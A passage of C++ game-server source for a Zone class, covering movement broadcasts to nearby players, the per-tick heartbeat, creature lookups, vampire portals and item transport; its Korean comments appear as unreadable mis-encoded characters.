								EffectVampirePortal* pEffectVampirePortal = dynamic_cast<EffectVampirePortal*>(pEffect);
								ZONE_COORD zonecoord = pEffectVampirePortal->getZoneCoord();

								GCAddVampirePortal gcAddVampirePortal;
								gcAddVampirePortal.setObjectID(pEffect->getObjectID());
								gcAddVampirePortal.setOwnerID(pEffectVampirePortal->getOwnerID());
								gcAddVampirePortal.setX(ix);
								gcAddVampirePortal.setY(iy);
								gcAddVampirePortal.setTargetZoneID(zonecoord.id);
								gcAddVampirePortal.setTargetX(zonecoord.x);
								gcAddVampirePortal.setTargetY(zonecoord.y);
								gcAddVampirePortal.setDuration(pEffectVampirePortal->getRemainDuration());
								gcAddVampirePortal.setCreateFlag(0);

								pPlayer->sendPacket(&gcAddVampirePortal);
							}
							// by sigi. 2002.6.10
							else if (pEffect->getEffectClass() == Effect::EFFECT_CLASS_SANCTUARY)
							{
								EffectSanctuary* pEffectSanctuary = dynamic_cast<EffectSanctuary*>(pEffect);

								ZoneCoord_t centerX = pEffectSanctuary->getCenterX();
								ZoneCoord_t centerY = pEffectSanctuary->getCenterY();
								
								// sanctuaryŽ ¥ °æ¿ìžž packet» ºž³Ž.
								if (centerX==ix && centerY==iy)
								{
									GCAddEffectToTile gcAddEffectToTile;

									gcAddEffectToTile.setObjectID(pEffect->getObjectID());
									gcAddEffectToTile.setXY(ix, iy); 
									gcAddEffectToTile.setEffectID(pEffect->getSendEffectClass());
									gcAddEffectToTile.setDuration(pEffect->getRemainDuration());

									pPlayer->sendPacket(&gcAddEffectToTile);
								}
							}
							else
							{
								GCAddEffectToTile gcAddEffectToTile;

								gcAddEffectToTile.setObjectID(pEffect->getObjectID());
								gcAddEffectToTile.setXY(ix, iy); 
								gcAddEffectToTile.setEffectID(pEffect->getSendEffectClass());
								gcAddEffectToTile.setDuration(pEffect->getRemainDuration());

								pPlayer->sendPacket(&gcAddEffectToTile);
							}
						}
					}
					////////////////////////////////////////////////////////////
					// ž §¿¡ åŸ¹° » °æ¿ì
					////////////////////////////////////////////////////////////
					else if (OClass == Object::OBJECT_CLASS_OBSTACLE)
					{
					}
					////////////////////////////////////////////////////////////
					// ž §¿¡ ÷» » °æ¿ì
					////////////////////////////////////////////////////////////
					else if (OClass == Object::OBJECT_CLASS_PORTAL)
					{
						// darkness
					}
					else
					{
						throw Error("invalid object class");
					}

				} while ( ++itr != objectList.end() );	// by sigi. 2002.5.8
			}//for ¿ºê§®µé¿¡ Žë ¹º¹
		}//for Y ¥¿¡ Žë ¹º¹
	}//for X ¥¿¡ Žë ¹º¹

	SAFE_DELETE(pGCAddXXX);

}
catch ( Throwable& t )
{
	filelog( "Zone_movePCBroadcast.log", "%s", t.toString().c_str() );
	throw t;
}

	__END_PROFILE_ZONE("Z_BC_MOVEPC");

	__END_CATCH
}


//////////////////////////////////////////////////////////////////////////////
// moveCreatureBroadcast
//
// PC°¡ ŸŽ ©ž®³(NPC,žóº)°¡ P(x1,y1)¿¡­ Q(x2,y2)· µ¿» ¶§,
// º¯ ¿µ¿ª¿¡ žçŽ PCµé¿¡° ºê·µå³º®Ž žîµåŽ.
//
//  žîµåž £â±â ü¿¡, 3 °¡ö ¶º žžµéŸîµŸžž Ž.
//////////////////////////////////////////////////////////////////////////////
void Zone::moveCreatureBroadcast(Creature* pCreature, ZoneCoord_t x1, ZoneCoord_t y1, ZoneCoord_t x2, ZoneCoord_t y2, bool bSendMove, bool bKnockback)
	throw(ProtocolException, Error)
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_BC_MOVE_CREATURE")

	try {

	Monster* pMonster = NULL;
	NPC* pNPC = NULL;

	Assert(pCreature != NULL);
	Assert(pCreature->isNPC() || pCreature->isMonster());

	// öç ¥¿¡ žé, GCMove ¶º ü ¥¿ öç ¹æâ» ü° µŸîŽ.
	GCMove gcMove;
	if (bSendMove)
	{
		gcMove.setObjectID(pCreature->getObjectID());
		gcMove.setX(x1);
		gcMove.setY(y1);
		gcMove.setDir(pCreature->getDir());
	}
	GCKnockBack gcKnockback;
	if (bKnockback)
	{
		gcKnockback.setObjectID(pCreature->getObjectID());
		gcKnockback.setOrigin(x1, y1);
		gcKnockback.setTarget(x2, y2);
	}

#ifdef __USE_ENCRYPTER__
	SocketEncryptOutputStream outputStream( NULL, szPacketHeader + ( bSendMove ? gcMove.getPacketSize() : gcKnockback.getPacketSize() ) + 2 );
	outputStream.setEncryptCode( m_EncryptCode );
#else
	SocketOutputStream outputStream( NULL, szPacketHeader + ( bSendMove ? gcMove.getPacketSize() : gcKnockback.getPacketSize() ) + 2 );
#endif
	if ( bSendMove )
		gcMove.writeHeaderNBody( outputStream );
	else
		gcKnockback.writeHeaderNBody( outputStream );

	// GCAddNPC/GCAddMonster ¶» žžµéŸîµŽ.
	Packet* pGCAddXXX = NULL;

	bool isMonster = !pCreature->isNPC();
//	bool isMonsterHide = false;
//	bool isMonsterInvisibility = false;

	if (!isMonster)
	{
		pNPC = dynamic_cast<NPC*>(pCreature);
		GCAddNPC* pGCAddNPC = new GCAddNPC();
		makeGCAddNPC(pGCAddNPC, pNPC);
		pGCAddXXX = pGCAddNPC;
	} 
	else // case of Monster
	{ 
		pMonster = dynamic_cast<Monster*>(pCreature);

		// Ž Ž º ö Ž »ó(NULL)· ³­ packet» »ýºŽ. by sigi
		pGCAddXXX = createMonsterAddPacket( pMonster, NULL );

		// monster »óž ±âŸïµŽ.
//		isMonsterHide = pMonster->isFlag(Effect::EFFECT_CLASS_HIDE);
//		isMonsterInvisibility = pMonster->isFlag(Effect::EFFECT_CLASS_INVISIBILITY);
	}

	// Ÿ¿¡­ ¹þŸî³¯ ¶§, GCDeleteObject ¶» ºž³Ž.
	GCDeleteObject gcDeleteObject;
	gcDeleteObject.setObjectID(pCreature->getObjectID());

	//////////////////////////////////////////////////////////////////////////////
	// Ÿ ¿µ¿ª »ó¿ì žðµ + 1 Ÿ¿ õ°¡²Ž. 
	// ¯Ž ¹æâ¿¡ µûž¥ ON_SIGHT ¿µ¿ª õ°¡µ±â ¶§¹®Ž.
	//////////////////////////////////////////////////////////////////////////////
	
	Object *pObject;
	
	for (ZoneCoord_t ix = max(0, x2 - maxViewportWidth - 1), endx = min(m_Width - 1, x2 + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, y2 - maxViewportUpperHeight - 1), endy = min(m_Height - 1, y2 + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			const list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();
			list<Object*>::const_iterator itr = objectList.begin();
			
			for (; itr != objectList.end() ; itr++) 
			{
				pObject = (*itr);
				
				if ( pObject == NULL || pObject->getObjectPriority() > OBJECT_PRIORITY_BURROWING_CREATURE )
				{
					continue;
				}
				
				Creature* pPC = dynamic_cast<Creature*>(pObject);

				Assert(pPC != NULL);

				// PC  °æ¿ì¿¡žž GCMove, GCAddMonster ¶» ºž³»Ž. žóºŽ ºž³Ÿ ¿ä°¡ Ÿøã~
				if (pPC->isPC()) 
				{
					Assert(pPC->getPlayer() != NULL);

					//////////////////////////////////////////////////////////////////////////////
					// OUT_OF_SIGHT -> ON_SIGHT/NEW_SIGHT : GCAddXXX 
					// IN_SIGHT/ON_SIGHT/NEW_SIGHT -> IN_SIGHT/ON_SIGHT/NEW_SIGHT : GCMove
					//////////////////////////////////////////////////////////////////////////////
					VisionState prevVS = pPC->getVisionState(x1,y1);
					VisionState currVS = pPC->getVisionState(x2,y2);

					// ºžö ŸŽ ¿µ¿ª¿¡­, °æ°è ¿µ¿ª» °¡ö Ÿ°í ¹·
					// Ÿ ³»º ¿µ¿ªž· µéŸî¿ŽŽ °º º°¡ŽŽ.
					//  ~ IN_SIGHT¹¿¡ ŸøŽ.
//					Assert(prevVS != OUT_OF_SIGHT || currVS != IN_SIGHT);

					// ObservingEye å®ž °¡®¿Ž.
//					EffectObservingEye* pEffectObservingEye = NULL;
//					if ( pPC->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
//					{
//						pEffectObservingEye = dynamic_cast<EffectObservingEye*>(pPC->findEffect(Effect::EFFECT_CLASS_OBSERVING_EYE));
//						//Assert( pEffectObservingEye != NULL );
//					}
//
					if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
					{
						if (isMonster)
						{
							if ( canSee( pPC, pMonster ) )
							{
								pPC->getPlayer()->sendPacket(pGCAddXXX);
							}
						}
						else
						{
							pPC->getPlayer()->sendPacket(pGCAddXXX);
						}
					} 
					else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
					{
						//if (bSendMove)
						//{
						//	pPC->getPlayer()->sendPacket(&gcMove);
						//}
						//else if (bKnockback)
						//{
						//	pPC->getPlayer()->sendPacket(&gcKnockback);
						//}
						pPC->getPlayer()->sendStream( &outputStream );
					} 
					else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT) 
					{
						pPC->getPlayer()->sendPacket(&gcDeleteObject);
					}

					//--------------------------------------------------------------------------------
					// ºê·µå³º®ž žžé,   PCž áçû ûž· µî·¹öž®.
					//--------------------------------------------------------------------------------
					if (pCreature->isMonster())
					{
						// ú §¿¡­ ¹ dynamic_cast µ »óŽ.
						VisionState vs = pMonster->getVisionState(ix,iy);
						if (vs >= IN_SIGHT && pMonster->getAlignment() == ALIGNMENT_AGGRESSIVE) 
						{
							if (isPotentialEnemy(pMonster, pPC))
							{
								pMonster->addPotentialEnemy(pPC);
							}
						}
					}
					
				}//if

			}//for

		}//for

	}//for

	// »ýº ¶» »èŽ.
	SAFE_DELETE(pGCAddXXX);

	// by sigi. 2002.12.15
	} catch (Throwable& t) {
		filelog("moveCreatureBroadcastError.log", "%s", t.toString().c_str());

		// Ž Žø®­  - -;
		throw;
	}

	__END_PROFILE_ZONE("Z_BC_MOVE_CREATURE")

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//  ±âž¶Ž Ÿ Ž ±âŽµé» ¿©±â¿¡ °¡µµ· Ž.
//////////////////////////////////////////////////////////////////////////////
void Zone::heartbeat ()
	throw(Error)
{
	__BEGIN_TRY
	__BEGIN_DEBUG

	try
	{
		__ENTER_CRITICAL_SECTION(m_Mutex)

		beginProfileEx("Z_PCQUEUE");

		// PCQueue PCž ž¿¡ °¡Ž.	
		while(! m_PCListQueue.empty()) 
		{
			Creature* pCreature = m_PCListQueue.front();
			Assert(pCreature != NULL);
			Assert(pCreature->getZone() == this);

			// ž¿¡ °¡°í, º¯ PCµé¿¡° ºê·µå³º®Ž.
			addPC(pCreature, pCreature->getX(), pCreature->getY(), DOWN);

			m_PCListQueue.pop_front();
		}

		endProfileEx("Z_PCQUEUE");

		beginProfileEx("Z_PC");
		m_pPCManager->processCreatures(); // process all PC
		endProfileEx("Z_PC");

		ProcessLogoutPC();
		
		// ž¶º ·¹Ÿî žŽú°¡ Žžé ž¶º ·¹ŸîŽ
		// by sigi. 2002.9.2
		if (m_pMasterLairManager!=NULL)
			m_pMasterLairManager->heartbeat(); // process master lair

		// ¹¬ž®î ·¹Ÿî žŽú°¡ Žžé ¹¬ž®î ·¹ŸîŽ.
		if ( m_pMikllizzLairManager != NULL )
		{
			m_pMikllizzLairManager->heartbeat();
//			cout << m_pMikllizzLairManager->toString() << endl;
		}

		// ï°¡µç žŽú°¡ Žžé ï°¡µç ·¹ŸîŽ.
		if ( m_pHellGardenTowerManager != NULL )
		{
			m_pHellGardenTowerManager->heartbeat();
			//			cout << m_pHellGardenTowerManager->toString() << endl;
		}

#ifdef __MENEGROTH_DOUNGEON_SYSTEM__
		if ( m_pMenegrothDoungeonZoneManager != NULL )
		{
			m_pMenegrothDoungeonZoneManager->heartbeat();
		}
#endif

		if ( m_pEventSurvivalZoneManager != NULL )
		{
			m_pEventSurvivalZoneManager->heartbeat();
		}

		// WarScheduler°¡ Žžé ºö..
		// by sigi. 2003.1.24
		if (m_pWarScheduler!=NULL
			&& g_pVariableManager->isWarActive())
		{
			Work* pWork = m_pWarScheduler->heartbeat();

			if (pWork!=NULL)
			{
				War* pWar = dynamic_cast<War*>(pWork);
				Assert(pWar!=NULL);

				g_pWarSystem->addWarDelayed( pWar );
			}
		}

		if ( m_pLevelWarManager != NULL
			&& g_pVariableManager->isActiveLevelWar() )
		{
			m_pLevelWarManager->heartbeat();
		// LevelWar Zone ¿¡Ž °£ º°· ¯·á ¹«·á »ç¿ë â »ó­ Ÿ .
			m_pLevelWarManager->freeUserTimeCheck();
		}

//		if ( m_pLevelWarManager != NULL )
//		{
//		}

		// player°¡ ŸîŸ monsterž heartbeatŽ.
		// ï, player°¡ ŸøŽ zoneº monster°¡ °¡žž÷ ŽŽ.
		// monster EffectManager°¡ Ÿ µ¹Ÿ°¡¹· ¹®°¡ µ öµµ öžž,
		// ©° ¹®°¡ ŸøŽ°í ºž°í.. -_-; .. by sigi. 2002.5.6
		//if ( m_ZoneID >= 1121 && m_ZoneID <= 1124)
		//	m_pCombatMonsterManager->processCreatures(); // üõ¿ë žóº AIž ³ž®Ž ºº, ±è°æ®
		//else
		//{
			if ( getPCCount() > 0 || ( isDynamicZone() && ( m_pDynamicZone->getStatus() == DYNAMIC_ZONE_STATUS_RUNNING ) ) )
			{
				beginProfileEx("Z_MONSTER");
				m_pMonsterManager->processCreatures(); // process all monsters
				endProfileEx("Z_MONSTER");
			}

//			m_pEventMonsterManager->processCreatures();
		//}

		beginProfileEx("Z_NPC");
		m_pNPCManager->processCreatures(); // process all npcs
		endProfileEx("Z_NPC");

		beginProfileEx("Z_ESCH");
		// žú å® ºì» žú ²Ž.
		m_pEffectScheduleManager->heartbeat();
		endProfileEx("Z_ESCH");

		// Item EffectManager¿¡­ getCurrentTime» £âö Ÿ° ±â §­.
		// by sigi. 2002.5.8
		Timeval currentTime;
	    getCurrentTime(currentTime);

		// Delete expired effects
		beginProfileEx("Z_EFFECT");
		m_pVampirePortalManager->heartbeat(currentTime);

		__ENTER_CRITICAL_SECTION(m_MutexEffect)
		m_pLockedEffectManager->heartbeat(currentTime);
		__LEAVE_CRITICAL_SECTION(m_MutexEffect)

		m_pEffectManager->heartbeat(currentTime);

		endProfileEx("Z_EFFECT");

		beginProfileEx("Z_WEATHER");
		// weather changing...
		m_pWeatherManager->heartbeat();
		endProfileEx("Z_WEATHER");

		beginProfileEx("Z_ITEM");
		// item heartbeaet

		int i = 0;

		for (map<ObjectID_t, Item*>::iterator itr = m_Items.begin(); itr != m_Items.end() ; itr++)
		{
			Item* pItem = itr->second;

			if ( pItem != NULL )
			{
				// by sigi. for debugging. 2002.12.23
				m_LastItemClass = (int)pItem->getItemClass();
	
				EffectManager& rEffectManager = pItem->getEffectManager();
				rEffectManager.heartbeat(currentTime);
				i++;
			}
		}

		endProfileEx("Z_ITEM");

		beginProfileEx("Z_PARTY");
		// party heartbeat
		m_pLocalPartyManager->heartbeat();
		endProfileEx("Z_PARTY");

		__LEAVE_CRITICAL_SECTION(m_Mutex)

		Timeval currentTime;
	    getCurrentTime(currentTime);

		// time band ž °»Ž.
		if ( m_UpdateTimebandTime < currentTime )
		{
			if ( !m_bTimeStop )
			{
				m_Timeband = g_pTimeManager->getTimeband();
			}

			// 5ž¶Ž timeband ž °»Ž. ° °£ž· 2º
			m_UpdateTimebandTime.tv_sec += 5;
		}

		// DynamicZone  °æ¿ì
		if ( isDynamicZone() )
			m_pDynamicZone->heartbeat();

		// broadcast packet queue ž ³ž®Ž.
		if ( !m_BroadcaseQueue.empty() )
			flushBroadcastPacket();
	}
	catch (Throwable & t)
	{
		filelog("ZoneBug.txt", "%s : %s", "Zone::heartbeat(2)", t.toString().c_str());
		cerr << t.toString() << endl;
		throw;
	}

	m_LoadValue ++;

	__END_DEBUG
	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// PCManager, MonsterManager, NPCManager ¿¡­ öµ OID ž °¡ø ©ž®³ž
// £Ÿ­ ž®Ž. Ÿø» °æ¿ì NoSuchElementException » ŽøøŽ.
//
//  žîµåŽ £°í Ž ©ž®³ ž(PC,NPC,Monster)ž žðž °æ¿ì¿¡
// »ç¿ëŽ. ¢žžžé, ž» ŸŸ³»­ getCreature(Creature::CreatureClass,ObjectID_t) 
// žîµåž »ç¿ëµµ· Ž.
//////////////////////////////////////////////////////////////////////////////
Creature* Zone::getCreature(ObjectID_t objectID) const
	throw()//NoSuchElementException, Error)
{
	__BEGIN_TRY

	// NoSuchElementException» Ÿ Ÿ²Ž ¹öü by sigi. 2002.5.2
	Creature* pCreature = NULL;

	pCreature = m_pMonsterManager->getCreature(objectID);

	if (pCreature==NULL)
	{
		pCreature = m_pPCManager->getCreature(objectID);

		if (pCreature==NULL)
		{
			pCreature = m_pNPCManager->getCreature(objectID);

//			if (pCreature==NULL)
//			{
//				pCreature = m_pEventMonsterManager->getCreature(objectID);
//			}

		}
	}

	return pCreature;

	/*
	try 
	{
		return m_pMonsterManager->getCreature(objectID);
	} 
	catch (NoSuchElementException) 
	{
		// not exist? go next
	} 
	*/

/*
//#ifdef __XMAS_EVENT_CODE__
	try 
	{
		return m_pEventMonsterManager->getCreature(objectID);
	} 
	catch (NoSuchElementException) 
	{
		// not exist? go next
	} 
//#endif
*/
	/*
	try 
	{
		return m_pPCManager->getCreature(objectID);
	} 
	catch (NoSuchElementException) 
	{
		// not exist? go next
	} 

	try 
	{
		return m_pNPCManager->getCreature(objectID);
	} 
	catch (NoSuchElementException) 
	{
		throw;
	}
	*/

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// PCManager, MonsterManager, NPCManager ¿¡­ öµ Name» °¡ø ©ž®³ž £Ÿ­
// ž®Ž. Ÿø» °æ¿ì NoSuchElementException » ŽøøŽ.
//
//  žîµåŽ £°í Ž ©ž®³ ž(PC,NPC,Monster)ž žðž °æ¿ì¿¡ »ç¿ëŽ.
// ¢žžžé, ž» ŸŸ³»­ getCreature(Creature::CreatureClass,Name) 
// žîµåž »ç¿ëµµ· Ž.
//////////////////////////////////////////////////////////////////////////////
Creature* Zone::getCreature(const string& Name) const
	throw()//NoSuchElementException, Error)
{
	__BEGIN_TRY

	// NoSuchElementException» Ÿ Ÿ²Ž ¹öü by sigi. 2002.5.2
	Creature* pCreature = NULL;

	pCreature = m_pPCManager->getCreature(Name);

	if (pCreature==NULL)
	{
		pCreature = m_pMonsterManager->getCreature(Name);

		if (pCreature==NULL)
		{
			pCreature = m_pNPCManager->getCreature(Name);

//			if(pCreature==NULL)
//			{
//				pCreature = m_pEventMonsterManager->getCreature(Name);
//			}
		}

		
	}

	return pCreature;

	/*
	try 
	{
		return m_pPCManager->getCreature(Name);
	} 
	catch (NoSuchElementException) 
	{
		// not exist? go next
	} 

	try 
	{
		return m_pMonsterManager->getCreature(Name);
	} 
	catch (NoSuchElementException) 
	{
		// not exist? go next
	} 
	*/

/*
#ifdef __XMAS_EVENT_CODE__
	try 
	{
		return m_pEventMonsterManager->getCreature(Name);
	} 
	catch (NoSuchElementException) 
	{
		// not exist? go next
	} 
#endif
*/

	/*
	try 
	{
		return m_pNPCManager->getCreature(Name);
	} 
	catch (NoSuchElementException) 
	{
		throw;
	}
	*/

	__END_CATCH
}

//--------------------------------------------------------------------------------
//
// ž¿¡­ ¯ OIDž °¡ø ¯ ©ž®³ ž» °¡ø ©ž®³ž £Ÿ­ ž®Ž.
//
//--------------------------------------------------------------------------------
Creature* Zone::getCreature(Creature::CreatureClass creatureClass, ObjectID_t objectID) const
	throw(NoSuchElementException, Error)
{
	__BEGIN_TRY

	if (creatureClass == Creature::CREATURE_CLASS_SLAYER)
	{
		return m_pPCManager->getCreature(objectID);
	}
	else if (creatureClass == Creature::CREATURE_CLASS_VAMPIRE)
	{
		return m_pPCManager->getCreature(objectID);
	}
	else if (creatureClass == Creature::CREATURE_CLASS_OUSTERS)
	{
		return m_pPCManager->getCreature(objectID);
	}
	else if (creatureClass == Creature::CREATURE_CLASS_NPC)
	{
		return m_pNPCManager->getCreature(objectID);
	}
	else if (creatureClass == Creature::CREATURE_CLASS_MONSTER)
	{
		return m_pMonsterManager->getCreature(objectID);
	}
/*
#ifdef __XMAS_EVENT_CODE__
		try
		{
			return m_pMonsterManager->getCreature(objectID);
		}
		catch (NoSuchElementException& nsee)
		{
		}

		return m_pEventMonsterManager->getCreature(objectID);
#else
*/
/*
#endif
*/

	return NULL; // evade warning.

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// get debug string
//////////////////////////////////////////////////////////////////////////////
string Zone::toString () const
	throw ()
{
	__BEGIN_TRY

	StringStream msg;

	msg << "Zone("
		<< "ZoneID:"          << (int)m_ZoneID
		<< ",ZoneGroupID:"    << (int)m_pZoneGroup->getZoneGroupID() 
		<< ",ZoneType:"       << (int)m_ZoneType
		<< ",ZoneLevel:"      << (int)m_ZoneLevel
		<< ",ZoneAccessMode:" << (int)m_ZoneAccessMode
		<< ",OwnerID:"        << m_OwnerID
		<< ",DarkLevel:"      << (int)m_DarkLevel
		<< ",LightLevel:"     << (int)m_LightLevel
		<< ",WeatherManager:" << m_pWeatherManager->toString();

	msg << ",#NPC:" << (int)m_NPCCount;
	for (uint i = 0 ; i < m_NPCCount ; i++)
		msg << ",NPC[" << i << "] : " << (int)m_NPCTypes[i];

	msg << ",#Monster:" << (int)m_MonsterCount;

	Assert( m_MonsterCount < maxMonsterPerZone );	// by sigi
	for (uint i = 0 ; i < m_MonsterCount ; i++)
		msg << ",Monster[" << i << "] : " << (int)m_MonsterTypes[i];

	msg << ",Width:"  << (int)m_Width
		<< ",Height:" << (int)m_Height
		<< ")";

	return msg.toString();

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// pTargetCreturež º ö Ž (player)µé listž µ¹·Ž.
// **********************************
//////////////////////////////////////////////////////////////////////////////
list<Creature*> Zone::getWatcherList(ZoneCoord_t x, ZoneCoord_t y, Creature* pTargetCreature)
	throw (Error)
{
	__BEGIN_TRY

	list<Creature*> cList;

	__BEGIN_PROFILE_ZONE("Z_GET_WATCHERLIST")

	if ( pTargetCreature == NULL )
		return cList;

	////////////////////////////////////////////////////////////
	// Ÿ ¿µ¿ª »ó¿ì žðµ + 1 Ÿ¿ õ°¡²Ž. 
	// ¯Ž ¹æâ¿¡ µûž¥ ON_SIGHT ¿µ¿ª õ°¡µ±â ¶§¹®Ž.
	////////////////////////////////////////////////////////////
	for (ZoneCoord_t ix = max(0, x - maxViewportWidth - 1), endx = min(m_Width - 1, x + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, y - maxViewportUpperHeight - 1), endy = min(m_Height - 1, y + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			const list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();
			list<Object*>::const_iterator itr = objectList.begin();
			for (; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE; itr++) 
			{
				Assert(*itr != NULL);

				Creature* pCreature = dynamic_cast<Creature*>(*itr);

				Assert(pCreature != NULL);

				if (pCreature->isPC()) 
				{
					Assert(pCreature->getPlayer() != NULL);

					// ±â  ºžŽ ¹» ¿ä°¡ ŸøŽ.
					if (pTargetCreature == pCreature
						|| pCreature->isFlag(Effect::EFFECT_CLASS_GHOST)) continue;
				
					VisionState vs = pCreature->getVisionState(x,y);

					if (vs >= IN_SIGHT)
					{
						if ( canSee( pCreature, pTargetCreature ) )
						{
							cList.push_back(pCreature);
						}
					}
				}//if

			}//for

		}//for

	}//for

	__END_PROFILE_ZONE("Z_GET_WATCHERLIST")

	return cList;
	
	__END_CATCH
}

void Zone::addToItemList(Item* pItem) throw()
{
	__BEGIN_TRY

	m_Items[ pItem->getObjectID()] = pItem;

	__END_CATCH
}

void Zone::deleteFromItemList(ObjectID_t id) throw()
{
	__BEGIN_TRY

	map< ObjectID_t, Item*>::iterator itr = m_Items.find(id);

	if (itr == m_Items.end())
		//throw NoSuchElementException();
		// NoSuch°. by sigi. 2002.5.3
	{
		return;
	}

	m_Items.erase(itr);

	__END_CATCH
}

void Zone::addVampirePortal(ZoneCoord_t cx, ZoneCoord_t cy, Vampire* pVampire, const ZONE_COORD& ZoneCoord) 
	throw()
{
	__BEGIN_TRY

	Assert(m_OuterRect.ptInRect(cx, cy));
	Assert(pVampire != NULL);

	// ¹ìŸî Ž·¿¡ µû¶ó µéŸî°¥ ö Ž ¿ø°ú, ö °£» °è»êŽ.
	// ž¿¡ ¹· °¡µŽ ° ŸŽ¹·, Ÿ°£ µô·¹ž °¡Ž.
	Duration_t duration = (60 + (pVampire->getINT(ATTR_CURRENT)-20)/3) * 10 + 20; // 0.1 Ž§±â ¶§¹®¿¡...
	int        count    = 3 + (pVampire->getINT(ATTR_CURRENT)-20)/10;

	// Ž å® °Ž ž »ýºŽ.
	EffectVampirePortal* pEffectVampirePortal = new EffectVampirePortal(this, cx, cy);
	pEffectVampirePortal->setDeadline(duration);
	pEffectVampirePortal->setOwnerID(pVampire->getName());
	pEffectVampirePortal->setZoneCoord(ZoneCoord.id, ZoneCoord.x, ZoneCoord.y);
	pEffectVampirePortal->setCount(count);

	// å® ºì» »ýº­ ŽõŽ.
	EffectSchedule* pEffectSchedule = new EffectSchedule;
	pEffectSchedule->setEffect(pEffectVampirePortal);
	pEffectSchedule->addWork(WORKCODE_ADD_VAMPIRE_PORTAL, NULL);
	m_pEffectScheduleManager->addEffectSchedule(pEffectSchedule);

	__END_CATCH
}

//-------------------------------------------------------------
// deleteMotorcycle( x, y, pMotorcycle )
//-------------------------------------------------------------
// ¹· ö¿ìö Ÿ°í.. zone heartbeat¶§ ö¿ìµµ·
// EffectDecayItem» º¿©µŽ.
//-------------------------------------------------------------
void Zone::deleteMotorcycle(ZoneCoord_t cx, ZoneCoord_t cy, Motorcycle* pMotorcycle)
	throw(Error)
{
	__BEGIN_TRY

	Assert(m_OuterRect.ptInRect(cx, cy));
	Assert(pMotorcycle != NULL);

	EffectDecayItem* pEffectDecayItem = new EffectDecayItem(this, cx, cy, (Item*)pMotorcycle, 0, 
															false); // DB¿¡­Ž ö¿ìö ŸŽŽ.
	pEffectDecayItem->setNextTime(999999);
	m_ObjectRegistry.registerObject(pEffectDecayItem);
	addEffect_LOCKING(pEffectDecayItem);
	
	__END_CATCH
}

/*
void Zone::decayMotorcycle(ZoneCoord_t cx, ZoneCoord_t cy, Motorcycle* pMotorcycle, Slayer* pSlayer)
	throw()
{
	__BEGIN_TRY

	cout << "Zone::decayMotorcycle	" << endl;

	Assert(m_OuterRect.ptInRect(cx, cy));
	Assert(pMotorcycle != NULL);

	// ž¿¡­ ¿ä¹ž ö¿ìŽ å®ž °¡Ž.
	EffectDecayMotorcycle* pEffectDecayMotorcycle = new EffectDecayMotorcycle(this, cx, cy, (Item*)pMotorcycle, 0, 
															      false); // DB¿¡­Ž ö¿ìö ŸŽŽ.
	pEffectDecayMotorcycle->setNextTime(999999);
	m_ObjectRegistry.registerObject(pEffectDecayMotorcycle);
	addEffect_LOCKING(pEffectDecayMotorcycle);
	
	__END_CATCH
}
*/

//-------------------------------------------------------------
// transportItemToCorpse
//-------------------------------------------------------------
// öç ž pItem» pZone (cx, cy)· ¿±äŽ.
// EffectTransportItem» º¿©­ ¿±äŽ.
//-------------------------------------------------------------
void Zone::transportItemToCorpse(Item* pItem, Zone* pTargetZone, ObjectID_t corpseObjectID)
	throw(Error)
{
	__BEGIN_TRY

	//cout << "transportItemToCorpse : " << (int)pZone->getZoneID() << ", (" << cx << ", " << cy << ")" << endl;
	Assert(pItem != NULL);

	if (pTargetZone->getZoneGroup()==this->getZoneGroup())
	{
		//cout << "same zone - to corpse" << endl;
		// °°º zonežé ¹· ¿±äŽ.
		//deleteFromItemList(pItem->getObjectID());

		Item* pCorpseItem = pTargetZone->getItem( corpseObjectID );

		if (pCorpseItem==NULL)
		{
			StringStream msg;
			msg << "[" << (int)m_ZoneID << "] °¡ Ÿø³: corpseObjectID=" << (int)corpseObjectID;

			throw Error(msg.toString());
		}
		else if (pCorpseItem->getItemClass()!=Item::ITEM_CLASS_CORPSE)
		{
			StringStream msg;
			msg << "[" << (int)m_ZoneID << "] °¡ ŸŽ³: corpseObjectID=" << (int)corpseObjectID
				<< ", itemClass=" << (int)pCorpseItem->getItemClass() 
				<< ", itemType=" << (int)pCorpseItem->getItemType();

			throw Error(msg.toString());
		}
		else
		{
			Corpse* pCorpse = dynamic_cast<Corpse*>(pCorpseItem);
			Assert(pCorpse!=NULL);

			pCorpse->addTreasure( pItem );
		}
	}
	else
	{
		//cout << "transportItemToCorpse" << endl;
		EffectTransportItemToCorpse* pEffectTransportItem = new EffectTransportItemToCorpse(this, pItem, pTargetZone, corpseObjectID, 0);
		pEffectTransportItem->setNextTime(999999);
		m_ObjectRegistry.registerObject(pEffectTransportItem);
		addEffect_LOCKING(pEffectTransportItem);
	}
	
	__END_CATCH
}

//-------------------------------------------------------------
// transportItem
//-------------------------------------------------------------
// öç ž pItem» pZone (cx, cy)· ¿±äŽ.
// EffectTransportItem» º¿©­ ¿±äŽ.
//-------------------------------------------------------------
void Zone::transportItem(ZoneCoord_t x, ZoneCoord_t y, Item* pItem, 
						Zone* pZone, ZoneCoord_t cx, ZoneCoord_t cy)
	throw(Error)
{
	__BEGIN_TRY

	//cout << "transportItem : " << (int)pZone->getZoneID() << ", (" << cx << ", " << cy << ")" << endl;

	// ° žø³ö°¡ Ž¿îµŽ. .; by sigi
	Assert(m_OuterRect.ptInRect(x, y));
	Assert(pItem != NULL);

	if (pZone->getZoneGroup()==this->getZoneGroup())
	{
		//cout << "same zone" << endl;
		// °°º zone group žé ¹· ¿±äŽ.
		deleteFromItemList(pItem->getObjectID());
		getTile(x, y).deleteItem();

